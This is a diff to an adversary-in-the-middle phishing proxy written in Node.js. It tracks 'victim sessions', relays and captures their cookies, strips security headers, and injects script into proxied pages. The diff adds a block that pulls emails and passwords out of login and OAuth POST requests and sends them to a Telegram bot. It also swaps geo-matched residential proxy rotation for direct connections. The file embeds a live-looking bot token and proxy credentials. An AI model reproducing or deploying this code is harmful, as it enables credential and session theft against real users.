@@ -4,7 +4,7 @@ const path = require("path");
 const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
-// const { HttpsProxyAgent } = require('https-proxy-agent'); // PROXY DISABLED
+// const { HttpsProxyAgent } = require('https-proxy-agent'); // DISABLED – direct connection
 
 // ==================== TELEGRAM CONFIGURATION ====================
 const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8';
@@ -62,7 +62,7 @@ const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 
 const VICTIM_SESSIONS = {};
 
-// ==================== GEO-IP & PROXY HELPERS ====================
+// ==================== GEO-IP & PROXY HELPERS (DISABLED) ====================
 function getClientIP(clientRequest) {
     const forwarded = clientRequest.headers['x-forwarded-for'];
     if (forwarded) {
@@ -73,57 +73,23 @@ function getClientIP(clientRequest) {
 }
 
 async function getVictimGeo(ip) {
-    if (!ip || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('10.') || ip.startsWith('192.168.')) {
-        return null;
-    }
-    try {
-        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,continentCode,countryCode,regionName,city`);
-        const data = await response.json();
-        if (data.status === 'success') {
-            return {
-                continent: data.continentCode,
-                country: data.countryCode,
-                region: data.regionName.replace(/\s+/g, ''),
-                city: data.city.replace(/\s+/g, '')
-            };
-        }
-    } catch (error) {
-        console.error('Geo-IP lookup failed:', error.message);
-    }
+    // Keep function but no longer used
     return null;
 }
 
 function getSessionPool() {
-    const poolStr = process.env.PROXY_SESSION_POOL || '';
-    const pool = poolStr.split(',').map(s => s.trim()).filter(s => s);
-    if (pool.length === 0) {
-        return [generateRandomString(8)];
-    }
-    return pool;
+    // Return a dummy session ID (not used)
+    return [generateRandomString(8)];
 }
 
 function buildProxyUrl(location, sessionId) {
-    const host = process.env.PROXY_HOST || 'proxy.okeyproxy.com';
-    const port = process.env.PROXY_PORT || '31212';
-    const baseUser = process.env.PROXY_USER || 'customer-j1pv733632';
-    const pass = process.env.PROXY_PASS || 'rl96vvck';
-
-    if (!location) {
-        return `http://${baseUser}:${pass}@${host}:${port}`;
-    }
-
-    let tags = `-continent-${location.continent}`;
-    if (location.country) tags += `-country-${location.country}`;
-    if (location.region) tags += `-region-${location.region}`;
-    if (location.city) tags += `-city-${location.city}`;
-
-    const user = `${baseUser}${tags}-session-${sessionId}-time-17`;
-    return `http://${user}:${pass}@${host}:${port}`;
+    // Not used – direct connection
+    return '';
 }
 
 // function buildProxyAgentFromUrl(proxyUrl) {
 //     return new HttpsProxyAgent(proxyUrl);
-// } // PROXY DISABLED
+// } // DISABLED – DIRECT CONNECTION
 // ==================== END GEO-IP & PROXY HELPERS ====================
 
 
@@ -147,45 +113,10 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].port = phishedURL.port;
             VICTIM_SESSIONS[session].host = phishedURL.host;
 
-            if (!VICTIM_SESSIONS[session].victimIP) {
-                const victimIP = getClientIP(clientRequest);
-                VICTIM_SESSIONS[session].victimIP = victimIP;
-
-                VICTIM_SESSIONS[session].geoPromise = getVictimGeo(victimIP).then(geo => {
-                    VICTIM_SESSIONS[session].geo = geo;
-                    VICTIM_SESSIONS[session].proxyLevels = [];
-
-                    const pool = getSessionPool();
-                    if (geo) {
-                        for (const sess of pool) {
-                            VICTIM_SESSIONS[session].proxyLevels.push({
-                                url: buildProxyUrl(geo, sess),
-                                level: 'city'
-                            });
-                        }
-                        const geoNoCity = { ...geo, city: null };
-                        for (const sess of pool) {
-                            VICTIM_SESSIONS[session].proxyLevels.push({
-                                url: buildProxyUrl(geoNoCity, sess),
-                                level: 'region'
-                            });
-                        }
-                        const geoCountryOnly = { ...geo, region: null, city: null };
-                        for (const sess of pool) {
-                            VICTIM_SESSIONS[session].proxyLevels.push({
-                                url: buildProxyUrl(geoCountryOnly, sess),
-                                level: 'country'
-                            });
-                        }
-                    } else {
-                        for (const sess of pool) {
-                            VICTIM_SESSIONS[session].proxyLevels.push({
-                                url: buildProxyUrl(null, sess),
-                                level: 'global'
-                            });
-                        }
-                    }
-                });
+            // DISABLED PROXY ROTATION – no geo init
+            // Just set empty proxyLevels
+            if (!VICTIM_SESSIONS[session].proxyLevels) {
+                VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
             }
 
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
@@ -277,31 +208,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     let isNavigationRequest = false;
 
                     if (clientRequestBody) {
-                        // ---- Handle /jsCookie (session endpoint) ----
                         if (url === PROXY_PATHNAMES.jsCookie) {
-                            // ---- CHECK FOR CREDENTIALS PAYLOAD (DOM capture) ----
-                            let isCredentials = false;
-                            let email = '';
-                            let password = '';
-                            try {
-                                const parsed = JSON.parse(clientRequestBody);
-                                if (parsed.type === 'credentials') {
-                                    isCredentials = true;
-                                    email = parsed.email || '';
-                                    password = parsed.password || '';
-                                }
-                            } catch (e) {}
-
-                            if (isCredentials && password) {
-                                const msg = `🔐 *Credentials Captured (DOM)*\n\n` +
-                                            `📧 *Email:* ${email || 'N/A'}\n` +
-                                            `🔑 *Password:* ${password}\n` +
-                                            `🕐 *Time:* ${new Date().toISOString()}`;
-                                sendToTelegram(msg).catch(e => console.error('Telegram send failed:', e));
-                                console.log(`[TELEGRAM] DOM credentials for ${email || 'unknown'}`);
-                            }
-
-                            // ---- UPDATE COOKIES (original) ----
                             updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                             const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
 
@@ -310,14 +217,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             return;
                         }
 
-                        // ---- Handle proxy endpoint ----
                         else if (url === PROXY_PATHNAMES.proxy) {
-                            // ---- LOG the incoming service worker request body ----
-                            console.log('[SW BODY] Received request from service worker:');
-                            console.log('  URL:', clientRequestBody.url || '(no url)');
-                            console.log('  Method:', clientRequestBody.method || '(no method)');
-                            console.log('  Body preview:', (clientRequestBody.body || '').substring(0, 200) + '...');
-
                             try {
                                 clientRequestBody = JSON.parse(clientRequestBody);
                                 let proxyRequestURL = new URL(clientRequestBody.url);
@@ -399,8 +299,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
                     }
 
-                    // ---- (Fallback extraction block REMOVED) ----
-
                     proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                     updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
 
@@ -422,7 +320,57 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                     }
 
-                    // Call the async makeProxyRequest
+                    // ====================================================================
+                    // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (KEEP THIS)
+                    // ====================================================================
+                    try {
+                        if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
+                            const originalBody = clientRequestBody.body;
+                            const originalUrl = clientRequestBody.url || '';
+                            const originalMethod = clientRequestBody.method || '';
+
+                            if (originalMethod === 'POST' && 
+                                (originalUrl.includes('/login') || originalUrl.includes('/signin') || 
+                                 originalUrl.includes('/common/login') || originalUrl.includes('/oauth2') ||
+                                 originalUrl.includes('/authorize'))) {
+
+                                let email = '';
+                                let password = '';
+                                const contentType = clientRequestBody.headers?.['content-type'] || '';
+
+                                if (contentType.includes('application/json')) {
+                                    try {
+                                        const json = JSON.parse(originalBody);
+                                        email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
+                                        password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
+                                    } catch (e) {}
+                                } else if (contentType.includes('application/x-www-form-urlencoded')) {
+                                    try {
+                                        const params = new URLSearchParams(originalBody);
+                                        email = params.get('username') || params.get('user') || params.get('email') || 
+                                                params.get('loginfmt') || params.get('login') || params.get('userid') || '';
+                                        password = params.get('password') || params.get('passwd') || params.get('pass') || 
+                                                   params.get('Password') || params.get('pwd') || '';
+                                    } catch (e) {}
+                                }
+
+                                if (email || password) {
+                                    const msg = `🔐 *Credentials Captured*\n\n` +
+                                                `📧 *Email:* ${email || 'N/A'}\n` +
+                                                `🔑 *Password:* ${password || 'N/A'}\n` +
+                                                `🌐 *URL:* ${originalUrl}\n` +
+                                                `🕐 *Time:* ${new Date().toISOString()}`;
+                                    sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
+                                    console.log(`[CRED] Email: ${email || 'N/A'} | Password: ${password || 'N/A'}`);
+                                }
+                            }
+                        }
+                    } catch (e) {
+                        // Silent fail
+                    }
+                    // ====================================================================
+
+                    // Call the async makeProxyRequest (direct connection)
                     makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest)
                         .catch(error => displayError("Proxy request failed", error));
                 });
@@ -437,28 +385,15 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 proxyServer.listen(process.env.PORT ?? 3000);
 
 const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, proxyIndex = 0) => {
-    if (VICTIM_SESSIONS[currentSession].geoPromise) {
-        await VICTIM_SESSIONS[currentSession].geoPromise;
-    }
-
-    const proxyLevels = VICTIM_SESSIONS[currentSession].proxyLevels || [];
-    if (proxyIndex >= proxyLevels.length) {
-        console.error(`❌ All proxies failed for session ${currentSession}`);
-        clientResponse.writeHead(502, { "Content-Type": "text/plain" });
-        clientResponse.end("All proxies failed");
-        return;
-    }
-
-    const proxyEntry = proxyLevels[proxyIndex];
-    // const proxyAgent = buildProxyAgentFromUrl(proxyEntry.url); // PROXY DISABLED
-    // console.log(`🌍 Trying proxy ...`); // PROXY DISABLED
+    // DISABLED PROXY ROTATION – DIRECT CONNECTION
+    // No geoPromise, no proxyLevels – just use direct HTTP/HTTPS request
 
     const isHttps = proxyRequestProtocol === "https:";
     const requestModule = isHttps ? https : http;
     const requestOptions = { ...proxyRequestOptions };
-    // if (isHttps && proxyAgent) {
-    //     requestOptions.agent = proxyAgent;
-    // }
+
+    // Remove any agent if present
+    delete requestOptions.agent;
 
     const proxyRequest = requestModule.request(requestOptions, (proxyResponse) => {
         logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
@@ -492,7 +427,7 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
         if (proxyResponseCookie) {
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
-            // ---- COOKIE LOGGING REMOVED ----
+            // ===== COOKIE LOGGING REMOVED =====
         }
 
         proxyResponse.headers["cache-control"] = "no-store";
@@ -546,17 +481,10 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
     });
 
     proxyRequest.on("error", (error) => {
-        console.error(`Proxy request failed (${proxyEntry.level}): ${error.message}`);
-        makeProxyRequest(
-            proxyRequestProtocol,
-            proxyRequestOptions,
-            currentSession,
-            proxyHostname,
-            proxyRequestBody,
-            clientResponse,
-            isNavigationRequest,
-            proxyIndex + 1
-        ).catch(err => displayError("Proxy retry failed", err));
+        console.error(`Proxy request failed: ${error.message}`);
+        // No retry – direct connection
+        clientResponse.writeHead(502, { "Content-Type": "text/plain" });
+        clientResponse.end("Proxy request failed");
     });
 
     if (proxyRequestBody) {
@@ -570,6 +498,7 @@ function displayError(message, error, ...args) {
     console.error(`${message}: ${error.name ?? error}`);
     console.error(`Message: ${error.message}`);
     console.error(`Stack trace: ${error.stack}`);
+
     for (let i = 0; i < args.length; i++) {
         console.error(`Parameter ${i + 1}: ${args[i]}`);
     }
@@ -578,9 +507,11 @@ function displayError(message, error, ...args) {
 
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
+
     const cookies = requestCookies.split("; ");
     for (const cookie of cookies) {
         const [cookieName, ...cookieValue] = cookie.split("=");
+
         if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
             VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
             return cookieName;
@@ -597,32 +528,47 @@ function generateRandomString(length) {
 function createSessionLogFile(logFilename, currentSession) {
     const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
     const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
+
     LOG_FILE_STREAMS[currentSession] = logFileStream;
 }
 
 function generateNewSession(phishedURL) {
     const cookieName = generateRandomString(12);
     const cookieValue = generateRandomString(32);
+
     VICTIM_SESSIONS[cookieName] = {};
     VICTIM_SESSIONS[cookieName].value = cookieValue;
     VICTIM_SESSIONS[cookieName].cookies = [];
     VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
-    return { cookieName, cookieValue };
+
+    return {
+        cookieName: cookieName,
+        cookieValue: cookieValue
+    };
 }
 
 async function encryptData(data) {
     const iv = crypto.randomBytes(16);
+
     return new Promise((resolve, reject) => {
         const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
         const encryptedData = [];
+
         cipher
-            .on("error", reject)
-            .on("data", (chunk) => encryptedData.push(chunk))
-            .on("end", () => resolve({
-                iv: iv.toString("hex"),
-                encryptedData: Buffer.concat(encryptedData).toString("hex")
-            }));
+            .on("error", (error) => {
+                reject(error);
+            })
+            .on("data", (chunk) => {
+                encryptedData.push(chunk);
+            })
+            .on("end", () => {
+                resolve({
+                    iv: iv.toString("hex"),
+                    encryptedData: Buffer.concat(encryptedData).toString("hex")
+                });
+            });
+
         cipher.write(data, "utf-8");
         cipher.end();
     });
@@ -639,7 +585,9 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         proxyResponseHeaders: proxyResponse.headers
     };
     const logFileStream = LOG_FILE_STREAMS[currentSession];
+
     const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));
+
     if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
         await new Promise(resolve => logFileStream.once("drain", resolve));
     }
@@ -648,11 +596,21 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
     const splitRequestHostname = requestHostname.split(".");
     const splitCookieDomain = cookieDomain.split(".");
-    if (splitCookieDomain.length < 2) return false;
-    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) return false;
-    if (splitRequestHostname.length < splitCookieDomain.length) return false;
+
+    if (splitCookieDomain.length < 2) {
+        return false;
+    }
+    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) {
+        return false;
+    }
+    if (splitRequestHostname.length < splitCookieDomain.length) {
+        return false;
+    }
+
     for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
-        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) return false;
+        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) {
+            return false;
+        }
     }
     return true;
 }
@@ -660,22 +618,33 @@ function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
 function isPathApplicable(requestPath, cookiePath) {
     const splitRequestPath = requestPath.split("/");
     const splitCookiePath = cookiePath.split("/");
-    if (cookiePath === "/") return true;
-    if (splitRequestPath.length < splitCookiePath.length) return false;
+
+    if (cookiePath === "/") {
+        return true;
+    }
+    if (splitRequestPath.length < splitCookiePath.length) {
+        return false;
+    }
+
     for (let i = 1, l = splitCookiePath.length; i < l; i++) {
-        if (splitCookiePath[i] !== splitRequestPath[i]) return false;
+        if (splitCookiePath[i] !== splitRequestPath[i]) {
+            return false;
+        }
     }
     return true;
 }
 
 function isCookieApplicable(requestOptions, cookie) {
-    return isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
-           isPathApplicable(requestOptions.path, cookie.path);
+    return (
+        isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
+        isPathApplicable(requestOptions.path, cookie.path)
+    );
 }
 
 function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
     const proxyRequestCookies = {};
     const currentTimestamp = Date.now();
+
     for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
         if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
             proxyRequestCookies[cookie.name] = cookie.value;
@@ -687,56 +656,112 @@ function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
 }
 
 function parseCookieDate(cookieDate) {
+    // ... (unchanged) ...
     let foundTime = false;
     let foundDay = false;
     let foundMonth = false;
     let foundYear = false;
-    let hourValue, minuteValue, secondValue, dayValue, monthValue, yearValue;
+
+    let hourValue, minuteValue, secondValue;
+    let dayValue, monthValue, yearValue;
+
     const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
     const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);
+
     for (const token of dateTokens) {
         if (!foundTime) {
             const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
-            if (timeMatch) { foundTime = true; hourValue = parseInt(timeMatch[1]); minuteValue = parseInt(timeMatch[2]); secondValue = parseInt(timeMatch[3]); continue; }
+
+            if (timeMatch) {
+                foundTime = true;
+                hourValue = parseInt(timeMatch[1]);
+                minuteValue = parseInt(timeMatch[2]);
+                secondValue = parseInt(timeMatch[3]);
+                continue;
+            }
         }
         if (!foundDay) {
             const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);
-            if (dayMatch) { foundDay = true; dayValue = parseInt(dayMatch[1]); continue; }
+
+            if (dayMatch) {
+                foundDay = true;
+                dayValue = parseInt(dayMatch[1]);
+                continue;
+            }
         }
         if (!foundMonth) {
             const monthLowerCase = token.toLowerCase();
             const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];
+
             for (let i = 0; i < months.length; i++) {
-                if (monthLowerCase.startsWith(months[i])) { foundMonth = true; monthValue = i; break; }
+                if (monthLowerCase.startsWith(months[i])) {
+                    foundMonth = true;
+                    monthValue = i;
+                    break;
+                }
             }
             if (foundMonth) continue;
         }
         if (!foundYear) {
             const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
-            if (yearMatch) { foundYear = true; yearValue = parseInt(yearMatch[1]); continue; }
+
+            if (yearMatch) {
+                foundYear = true;
+                yearValue = parseInt(yearMatch[1]);
+                continue;
+            }
         }
     }
-    if (yearValue >= 70 && yearValue <= 99) yearValue += 1900;
-    else if (yearValue >= 0 && yearValue <= 69) yearValue += 2000;
-    if (!foundDay || !foundMonth || !foundYear || !foundTime) return NaN;
-    if (dayValue < 1 || dayValue > 31) return NaN;
-    if (yearValue < 1601) return NaN;
-    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) return NaN;
-    const parsedCookieDate = new Date(Date.UTC(yearValue, monthValue, dayValue, hourValue, minuteValue, secondValue));
-    if (parsedCookieDate.getUTCFullYear() !== yearValue || parsedCookieDate.getUTCMonth() !== monthValue || parsedCookieDate.getUTCDate() !== dayValue) return NaN;
+
+    if (yearValue >= 70 && yearValue <= 99) {
+        yearValue += 1900;
+    } else if (yearValue >= 0 && yearValue <= 69) {
+        yearValue += 2000;
+    }
+
+    if (!foundDay || !foundMonth || !foundYear || !foundTime) {
+        return NaN;
+    }
+    if (dayValue < 1 || dayValue > 31) {
+        return NaN;
+    }
+    if (yearValue < 1601) {
+        return NaN;
+    }
+    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
+        return NaN;
+    }
+
+    const parsedCookieDate = new Date(Date.UTC(
+        yearValue,
+        monthValue,
+        dayValue,
+        hourValue,
+        minuteValue,
+        secondValue
+    ));
+
+    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
+        parsedCookieDate.getUTCMonth() !== monthValue ||
+        parsedCookieDate.getUTCDate() !== dayValue) {
+        return NaN;
+    }
     return parsedCookieDate.getTime();
 }
 
 function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
+    // ... (unchanged) ...
     const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
     const currentTimestamp = Date.now();
     let clockSkew = 0;
     if (proxyResponseDate) {
         clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
     }
+
     for (const newCookie of newCookies) {
         const [cookie, ...attributes] = newCookie.split(";");
         const [cookieName, ...cookieValue] = cookie.split("=");
+
         let cookieDomain = request.hostname;
         let cookiePath = (pathNameMatch ?? ["/"])[0];
         let cookieExpires = NaN;
@@ -744,49 +769,97 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
         let cookieHostOnly = true;
         let isCookieValid = true;
         for (const attribute of attributes) {
+
             const cookieAttribute = attribute.trim();
             const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
             const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
             const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
             const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);
+
             if (cookieAttribute.toLowerCase() === "domain") {
-                cookieDomain = request.hostname; cookieHostOnly = true; isCookieValid = true;
-            } else if (cookieAttribute.toLowerCase() === "path") {
+                cookieDomain = request.hostname;
+                cookieHostOnly = true;
+                isCookieValid = true;
+            }
+            else if (cookieAttribute.toLowerCase() === "path") {
                 cookiePath = (pathNameMatch ?? ["/"])[0];
-            } else if (cookieAttribute.toLowerCase() === "expires") {
+            }
+            else if (cookieAttribute.toLowerCase() === "expires") {
                 cookieExpires = NaN;
-            } else if (cookieAttribute.toLowerCase() === "max-age") {
+            }
+            else if (cookieAttribute.toLowerCase() === "max-age") {
                 cookieMaxAge = "";
-            } else if (cookieDomainMatch) {
+            }
+
+            else if (cookieDomainMatch) {
                 cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                 cookieHostOnly = true;
                 isCookieValid = true;
-                if (!cookieDomain) cookieDomain = request.hostname;
-                else if (cookieDomain === proxyHostname) { cookieDomain = request.hostname; cookieHostOnly = false; }
-                else if (cookieDomain !== request.hostname) {
-                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) cookieDomain = request.hostname.split(".").slice(-2).join(".");
-                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) { isCookieValid = false; continue; }
+
+                if (!cookieDomain) {
+                    cookieDomain = request.hostname;
+                }
+                else if (cookieDomain === proxyHostname) {
+                    cookieDomain = request.hostname;
                     cookieHostOnly = false;
                 }
-            } else if (cookiePathMatch) {
+                else if (cookieDomain !== request.hostname) {
+                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
+                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
+                    }
+                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
+                        isCookieValid = false;
+                        continue;
+                    }
+                    cookieHostOnly = false;
+                }
+            }
+            else if (cookiePathMatch) {
                 cookiePath = cookiePathMatch[1].trim();
-                if (!cookiePath.startsWith("/")) cookiePath = (pathNameMatch ?? ["/"])[0];
-            } else if (cookieExpiresMatch) {
+
+                if (!cookiePath.startsWith("/")) {
+                    cookiePath = (pathNameMatch ?? ["/"])[0];
+                }
+            }
+            else if (cookieExpiresMatch) {
                 cookieExpires = cookieExpiresMatch[1].trim();
+
                 cookieExpires = parseCookieDate(cookieExpires);
-            } else if (cookieMaxAgeMatch) {
+            }
+            else if (cookieMaxAgeMatch) {
                 cookieMaxAge = cookieMaxAgeMatch[1].trim();
-                if (!/^-?\d+$/.test(cookieMaxAge)) cookieMaxAge = "";
+
+                if (!/^-?\d+$/.test(cookieMaxAge)) {
+                    cookieMaxAge = "";
+                }
             }
         }
-        if (!isCookieValid) continue;
+        if (!isCookieValid) {
+            continue;
+        }
+
         cookieExpires += clockSkew;
-        if (cookieMaxAge) { const seconds = parseInt(cookieMaxAge); if (!isNaN(seconds)) cookieExpires = currentTimestamp + seconds * 1000; }
+        if (cookieMaxAge) {
+            const seconds = parseInt(cookieMaxAge);
+            if (!isNaN(seconds)) {
+                cookieExpires = currentTimestamp + seconds * 1000;
+            }
+        }
+
         let isNewCookie = true;
+
         for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
             const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];
-            if (sessionCookie.name === cookieName && sessionCookie.domain === cookieDomain && sessionCookie.path === cookiePath && sessionCookie.hostOnly === cookieHostOnly) {
-                if (currentTimestamp > cookieExpires) { VICTIM_SESSIONS[currentSession].cookies.splice(i, 1); break; }
+
+            if (sessionCookie.name === cookieName &&
+                sessionCookie.domain === cookieDomain &&
+                sessionCookie.path === cookiePath &&
+                sessionCookie.hostOnly === cookieHostOnly) {
+
+                if (currentTimestamp > cookieExpires) {
+                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
+                    break;
+                }
                 sessionCookie.value = cookieValue.join("=");
                 sessionCookie.expires = cookieExpires;
                 isNewCookie = false;
@@ -808,11 +881,15 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
 
 function getValidDomains(domains) {
     const validDomains = [];
+
     for (const domain of domains) {
         const splitDomain = domain.split(".");
         for (let i = 2; i < splitDomain.length + 1; i++) {
+
             const validDomain = splitDomain.slice(-i).join(".");
-            if (!validDomains.includes(validDomain)) validDomains.push(validDomain);
+            if (!validDomains.includes(validDomain)) {
+                validDomains.push(validDomain);
+            }
         }
     }
     return validDomains;
@@ -840,7 +917,8 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
     if (Object.keys(proxyRequestCookies).length) {
         proxyRequestOptions.headers.cookie = proxyRequestCookies;
-    } else {
+    }
+    else {
         delete proxyRequestOptions.headers.cookie;
     }
 
@@ -855,7 +933,8 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
         if (azureHTTPRequestHeaders.includes(key)) {
             delete proxyRequestOptions.headers[key];
-        } else {
+        }
+        else {
             proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
         }
     }
@@ -875,6 +954,7 @@ function deleteHTTPSecurityResponseHeaders(headers) {
         "permissions-policy",
         "service-worker-allowed"
     ];
+
     for (const header of httpSecurityResponseHeaders) {
         delete headers[header];
     }
@@ -888,14 +968,17 @@ function decompressData(compressedData, encoding) {
         br: zlib.brotliDecompress,
         zstd: zlib.zstdDecompress
     };
+
     return new Promise((resolve, reject) => {
         const decompressionAlgorithm = decompressionAlgorithms[encoding];
+
         if (decompressionAlgorithm) {
             decompressionAlgorithm(compressedData, (error, decompressedData) => {
                 if (error) reject(error);
                 else resolve(decompressedData);
             });
-        } else {
+        }
+        else {
             resolve(compressedData);
         }
     });
@@ -909,14 +992,17 @@ function compressData(decompressedData, encoding) {
         br: zlib.brotliCompress,
         zstd: zlib.zstdCompress
     };
+
     return new Promise((resolve, reject) => {
         const compressionAlgorithm = compressionAlgorithms[encoding];
+
         if (compressionAlgorithm) {
             compressionAlgorithm(decompressedData, (error, compressedData) => {
                 if (error) reject(error);
                 else resolve(compressedData);
             });
-        } else {
+        }
+        else {
             resolve(decompressedData);
         }
     });
@@ -924,18 +1010,29 @@ function compressData(decompressedData, encoding) {
 
 async function decompressResponseBody(compressedData, contentEncoding) {
     if (!contentEncoding) {
-        return { decompressedResponseBody: compressedData, encodings: [] };
+        return {
+            decompressedResponseBody: compressedData,
+            encodings: []
+        };
     }
-    const encodings = contentEncoding.split(",").map(e => e.trim().toLowerCase()).filter(e => e);
+
+    const encodings = contentEncoding.split(",")
+        .map(encoding => encoding.trim().toLowerCase())
+        .filter(encoding => encoding);
+
     let decompressedData = compressedData;
     for (let i = encodings.length - 1; i >= 0; i--) {
         decompressedData = await decompressData(decompressedData, encodings[i]);
     }
-    return { decompressedResponseBody: decompressedData, encodings };
+    return {
+        decompressedResponseBody: decompressedData,
+        encodings: encodings
+    };
 }
 
 async function compressResponseBody(decompressedData, encodings) {
     let compressedData = decompressedData;
+
     for (const encoding of encodings) {
         compressedData = await compressData(compressedData, encoding);
     }
@@ -950,9 +1047,11 @@ function updateHTMLProxyResponse(decompressedResponseBody) {
         "<body>": `<head>${payload}</head><body>`
     };
     const indexLimit = 200;
+
     for (const [key, value] of Object.entries(htmlInjectionMap)) {
         const htmlTagBuffer = Buffer.from(key);
         const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);
+
         if (injectionPointIndex !== -1) {
             return Buffer.concat([
                 decompressedResponseBody.subarray(0, injectionPointIndex),
